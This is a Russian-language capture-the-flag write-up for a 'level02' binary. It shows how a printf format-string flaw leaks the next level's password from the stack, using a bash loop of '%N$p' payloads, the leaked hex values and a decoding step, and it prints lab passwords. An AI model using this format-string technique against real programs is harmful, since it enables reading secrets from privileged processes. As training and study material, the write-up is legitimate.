## HowTo

```
> su level02
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

### Инструменты:
- gdb + peda
- Ida Pro + hex rays

**NB:** Для работы с файлом стягиваем его на локальную машину

### Анализ и ход решения

1. Бинарь `./level02` с правами `level03`
2. На старте исполнения в буфер читается содержимое файла с паролем `/home/users/level03/.pass`
3. Затем запрашивается логин и пароль от пользователя. 
Пароль проверяется и если все ок, печатется буфер, содержащий `.pass`
4. Нас интересует шаг запроса логин \ пароля. 
Сообщение `--[ Username:` выводится через `printf`, доступный для взлома

**Идея взлома:**\
Т.к. пароль из `.pass` уже загружен в буфер на момент запроса логин, пароль - 
пробуем распечатать содержимое адресов на стеке, до которых можем дотянуться через `printf`

1. Подбираем +\- произвольное число итераций печати, в ходе экспериментов пришел к разумному числу `50`
```
for ((i = 1; i < 50; i++)); do echo "$i | %$i\$p" | ./level02; done | awk '/does not/'
```

2. Находим в аутпуте +\- разумные значения 

Все прошлые пароли состояли из 40 чаров, логично предположить, что и этот такой же.
Учитывая 16-ю систему, предполагаем, что наш пароль лежит в виде 5 последовательных значений (5 * 8 байт)
```
22 | 0x756e505234376848 does not have access!
23 | 0x45414a3561733951 does not have access!
24 | 0x377a7143574e6758 does not have access!
25 | 0x354a35686e475873 does not have access!
26 | 0x48336750664b394d does not have access!
```

3. Остается интерпретировать полученные значения.
Чуть форматируем наш цикл для удобства
```
for ((i = 1; i < 50; i++)); do echo "$i | %$i\$p" | ./level02; done | awk '/does not/{print $3}'

0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d
```

4. Сохраняем в файлик локально и запускаем python-скрипт

Скрипт проходится по шестнадцетеричным значениям, инвертирует их (little endian), конкатенирует и декодит.
```
> python3 parse_hexes.py 
pass file name with hexes: hexes.txt

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
